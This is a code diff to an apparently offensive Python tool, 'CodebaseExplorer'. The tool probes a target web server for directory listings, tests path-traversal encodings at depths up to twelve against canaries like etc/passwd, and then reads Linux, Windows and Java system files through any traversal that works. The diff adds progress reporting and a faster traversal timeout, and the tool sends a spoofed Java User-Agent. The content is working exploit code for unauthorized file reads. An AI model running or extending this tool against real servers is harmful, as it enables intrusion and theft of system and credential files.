@@ -27,9 +27,14 @@ import urllib.error
 import urllib.parse
 import urllib.request
 from dataclasses import dataclass, field
-from typing import Any
+from typing import Any, Callable
 
 _DEFAULT_TIMEOUT = 5.0
+
+# Traversal probes can use a shorter timeout: if the server is reachable,
+# 404 / 403 responses come back immediately.  Long waits mean the path is
+# blocked at the firewall level and we should move on quickly.
+_TRAVERSAL_TIMEOUT = 2.0
 
 # ---------------------------------------------------------------------------
 # Path traversal payloads (various encoding bypasses)
@@ -151,7 +156,10 @@ class CodebaseExplorer:
 
     Usage::
 
-        explorer = CodebaseExplorer()
+        def on_progress(msg: str) -> None:
+            print(msg)
+
+        explorer = CodebaseExplorer(progress_cb=on_progress)
         result = explorer.explore("http://target:8080/")
         for f in result.readable_files:
             print(f.path, f.content_text[:200])
@@ -162,8 +170,19 @@ class CodebaseExplorer:
             print(fr.content_text)
     """
 
-    def __init__(self, timeout: float = _DEFAULT_TIMEOUT):
+    def __init__(
+        self,
+        timeout: float = _DEFAULT_TIMEOUT,
+        progress_cb: Callable[[str], None] | None = None,
+    ):
         self.timeout = timeout
+        self._progress_cb = progress_cb
+        self._traversal_timeout = min(_TRAVERSAL_TIMEOUT, timeout)
+
+    def _progress(self, msg: str) -> None:
+        """Emit a progress message if a callback was provided."""
+        if self._progress_cb is not None:
+            self._progress_cb(msg)
 
     # ------------------------------------------------------------------
     # Public API
@@ -191,30 +210,43 @@ class CodebaseExplorer:
             return result
 
         # 2. Directory listing
+        self._progress("Checking directory listing...")
         result.directory_listing = self._try_directory_listing(base_url)
+        if result.directory_listing:
+            self._progress(f"Directory listing: {len(result.directory_listing)} entries found")
 
         # 3. Codebase-relative probes
+        self._progress("Probing codebase paths...")
         for path in _CODEBASE_PROBE_PATHS:
             probe = self._probe_path(base_url, path)
             if probe:
                 result.probed_paths.append(probe)
+                self._progress(f"Accessible: {path or '/'}  ({probe['content_length']} bytes)")
 
         # 4. Path traversal detection
+        self._progress("Testing path traversal...")
         traversal = self._test_traversal(base_url)
         if traversal:
             result.traversal_vulnerable = True
             result.working_traversal = traversal["encoding"]
             result.working_depth = traversal["depth"]
+            self._progress(
+                f"Traversal vulnerable! Technique: {traversal['encoding']} × {traversal['depth']}"
+            )
 
             # 5. Read known files through the working traversal
             all_probe_files = _LINUX_PROBE_FILES + _WINDOWS_PROBE_FILES + _JAVA_PROBE_FILES
             for fpath in all_probe_files:
+                self._progress(f"Reading {fpath}...")
                 fr = self._read_file_via_traversal(
                     base_url, fpath,
                     traversal["encoding"], traversal["depth"],
                 )
                 if fr.success:
                     result.readable_files.append(fr)
+                    self._progress(f"Read OK: {fpath}  ({len(fr.content)} bytes)")
+        else:
+            self._progress("No path traversal vulnerability found.")
 
         return result
 
@@ -244,7 +276,8 @@ class CodebaseExplorer:
             for depth in range(1, 13):
                 traversal = encoding * depth
                 url = base_url + traversal + clean
-                res = self._fetch(url)
+                self._progress(f"Trying traversal {encoding.strip()} ×{depth}: {clean}")
+                res = self._fetch(url, timeout=self._traversal_timeout)
                 if res["success"] and self._looks_like_content(res["body"], clean):
                     return FileReadResult(
                         path=file_path, success=True,
@@ -324,7 +357,11 @@ class CodebaseExplorer:
         return None
 
     def _test_traversal(self, base_url: str) -> dict[str, Any] | None:
-        """Test all encoding × depth combos against known canary files."""
+        """Test all encoding × depth combos against known canary files.
+
+        Uses a short per-request timeout to fail fast on unreachable paths.
+        Bails out early as soon as a working technique is confirmed.
+        """
         canaries = [
             ("etc/passwd", b"root:"),
             ("etc/hostname", None),
@@ -336,7 +373,10 @@ class CodebaseExplorer:
                 for depth in range(1, 13):
                     traversal = encoding * depth
                     url = base_url + traversal + canary_path
-                    res = self._fetch(url)
+                    self._progress(
+                        f"Traversal probe: {encoding.strip()}×{depth} → {canary_path}"
+                    )
+                    res = self._fetch(url, timeout=self._traversal_timeout)
                     if res["success"] and res["body"]:
                         if canary_sig is None or canary_sig in res["body"]:
                             return {
@@ -352,7 +392,7 @@ class CodebaseExplorer:
     ) -> FileReadResult:
         traversal = encoding * depth
         url = base_url + traversal + file_path
-        res = self._fetch(url)
+        res = self._fetch(url, timeout=self._traversal_timeout)
         if res["success"] and res["body"]:
             return FileReadResult(
                 path=file_path, success=True,
@@ -363,11 +403,12 @@ class CodebaseExplorer:
             )
         return FileReadResult(path=file_path)
 
-    def _fetch(self, url: str) -> dict[str, Any]:
+    def _fetch(self, url: str, *, timeout: float | None = None) -> dict[str, Any]:
+        t = timeout if timeout is not None else self.timeout
         try:
             req = urllib.request.Request(url, method="GET")
             req.add_header("User-Agent", "Java/1.8.0_191")
-            resp = urllib.request.urlopen(req, timeout=self.timeout)
+            resp = urllib.request.urlopen(req, timeout=t)
             body = resp.read(1_048_576)
             return {"success": True, "status": resp.status, "body": body}
         except urllib.error.HTTPError as exc:
